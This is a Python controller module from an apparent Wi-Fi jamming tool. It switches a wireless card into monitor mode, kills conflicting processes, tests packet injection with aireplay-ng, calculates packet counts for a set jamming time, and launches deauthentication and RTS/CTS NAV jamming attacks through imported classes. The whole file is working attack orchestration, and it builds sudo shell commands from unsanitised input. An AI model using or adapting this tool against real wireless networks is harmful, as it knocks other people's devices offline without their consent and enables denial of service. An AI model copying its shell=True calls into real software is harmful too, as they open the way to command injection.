from models.deauthentication import Deauthentication
from models.rts_cts_NAV import RTS_CTS_NAV
import os, subprocess
from subprocess import PIPE

FNULL = open(os.devnull, 'w')

class Controller():

    # Get the mac of the card
    def get_mac(self, card):
        card_mac = subprocess.Popen('ifdata -ph {}'.format(card), stdout=PIPE, shell=True).stdout
        card_mac = card_mac.read()
        card_mac = card_mac.decode()
        return card_mac


    # Calculate the time to Jam
    def calcule_packets(self, attack, time):

        packets = ""

        time = int(time)

        if attack == "Deauthentication":

            packets = (60*time)/0.0001

        elif attack == "RTS/CTS NAV":

            packets = (60*time)/0.03

        packets = int(packets)

        return packets

    #def monitor_mode(self, card, channel):
        #subprocess.call('airmon-ng start {} {}'.format(card, channel), shell=True)

    #def quit_monitor_mode(self, card):
        #subprocess.call('airmon-ng stop {}'.format(card), stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    def monitor_mode(self, card, channel):
        subprocess.call('sudo ip link set {} down'.format(card), shell=True)
        subprocess.call('sudo iw dev {} set type monitor'.format(card), shell=True)
        subprocess.call('sudo ip link set {} up'.format(card), shell=True)
        subprocess.call('sudo iw dev {} set channel {}'.format(card, channel), shell=True)

    def quit_monitor_mode(self, card):
        subprocess.call('sudo ip link set {} down'.format(card), shell=True)
        subprocess.call('sudo iw dev {} set type managed'.format(card), shell=True)
        subprocess.call('sudo ip link set {} up'.format(card), shell=True)
        subprocess.call('service network-manager start', shell=True)

    def injection_test(self, bssid, card):
        subprocess.call('aireplay-ng --test -a {} {}'.format(bssid, card), shell=True)

    def clear(self):
        subprocess.call('clear', shell=True)

    def kill_processes(self):
        subprocess.call('airmon-ng check kill', stdout=FNULL, stderr=subprocess.STDOUT, shell=True)

    def nav_jamming(self, address, card_mac, monitor_card, selective, subtype, packets, inter):
        nav = RTS_CTS_NAV(address, card_mac, monitor_card, subtype, packets, inter)
        nav.create_packet()
        if selective == False:
            nav.jam()
        else:
            nav.sniff()
        self.quit_monitor_mode(monitor_card)


    def deauthentication_jamming(self, client, address, packets, monitor_card):
        dea = Deauthentication(client, address, packets, monitor_card)
        dea.create_packet()
        dea.jam()
        self.quit_monitor_mode(monitor_card)
